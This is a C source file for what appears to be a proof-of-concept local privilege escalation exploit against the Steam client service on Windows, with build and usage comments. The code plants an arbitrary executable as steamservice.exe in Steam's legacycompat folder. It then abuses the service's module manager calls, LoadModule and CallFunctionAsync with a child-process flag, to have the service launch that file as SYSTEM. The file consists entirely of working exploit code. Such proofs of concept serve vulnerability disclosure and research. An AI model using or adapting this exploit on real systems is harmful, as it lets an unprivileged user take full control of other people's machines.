// Build: cl /nologo /O2 lpe_modulemanager.c /Fe:lpe_modulemanager.exe advapi32.lib
// Usage: lpe_modulemanager.exe [steamservice.exe payload] [steamclient64.dll]
//   payload defaults to steamservice.exe in the current directory
#include "poc_connect.h"

static uint32_t crc32(const uint8_t *p, uint32_t n) {
    uint32_t c = 0xFFFFFFFF;
    for (uint32_t i = 0; i < n; i++) {
        c ^= p[i];
        for (int j = 0; j < 8; j++) c = (c & 1) ? (c >> 1) ^ 0xEDB88320 : c >> 1;
    }
    return ~c;
}

int main(int argc, char **argv)
{
    char payload[MAX_PATH] = {0}, dll[MAX_PATH] = {0};
    for (int i = 1; i < argc; i++) {
        size_t len = strlen(argv[i]);
        if (len >= 4 && _stricmp(argv[i] + len - 4, ".dll") == 0) lstrcpynA(dll, argv[i], sizeof(dll));
        else lstrcpynA(payload, argv[i], sizeof(payload));
    }
    if (!payload[0]) lstrcpynA(payload, "steamservice.exe", sizeof(payload));

    // Resolve <SteamDir>\legacycompat and plant our exe as steamservice.exe.
    char base[MAX_PATH], dest[MAX_PATH];
    if (dll[0]) lstrcpynA(base, dll, sizeof(base));
    else if (!resolve_steamclient(base, sizeof(base))) { printf("[!] could not locate the Steam install\n"); return 1; }
    { char *s = strrchr(base, '\\'); if (s) *s = '\0'; }   // base = Steam install dir
    _snprintf(dest, sizeof(dest), "%s\\legacycompat", base);
    CreateDirectoryA(dest, NULL);
    lstrcatA(dest, "\\steamservice.exe");
    if (!CopyFileA(payload, dest, FALSE)) {
        printf("[!] could not plant %s -> %s : %lu\n", payload, dest, GetLastError());
        return 1;
    }
    printf("[+] planted payload: %s\n", dest);

    CSteamServiceWin32 *svc = steam_connect(dll[0] ? dll : NULL);
    if (!svc) return 1;

    int rc = 1;
    __try {
        IClientModuleManagerMap *mm = svc->pModuleManager;
        if (!mm) { printf("[!] IClientModuleManager not available\n"); __leave; }

        // A throwaway module so the async path has something to act on. Its bytes are
        // written to legacycompat\servicecall_<id>.dll and never used by our exe.
        uint8_t mod[4] = { 'P', 'o', 'C', 0 };
        uint32_t id = crc32(mod, sizeof(mod));
        uint8_t loaded = mm->vtbl->LoadModule(mm, id, mod, sizeof(mod));
        printf("[+] LoadModule = %u (id 0x%08X)\n", loaded, id);

        uint32_t r = mm->vtbl->CallFunctionAsync(mm, id, MODULE_FLAG_CHILD_PROCESS,
                                                 0, 0, 0, 0, mod, sizeof(mod), 88);
        printf("[+] CallFunctionAsync(flags=0x%X) = %u -- service spawns legacycompat\\steamservice.exe as SYSTEM\n",
               MODULE_FLAG_CHILD_PROCESS, r);
        printf("    verify: C:\\Windows\\Temp\\legacycompat_pwned.txt\n");
        rc = 0;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[!] faulted 0x%08lX\n", GetExceptionCode());
    }

    return rc;
}
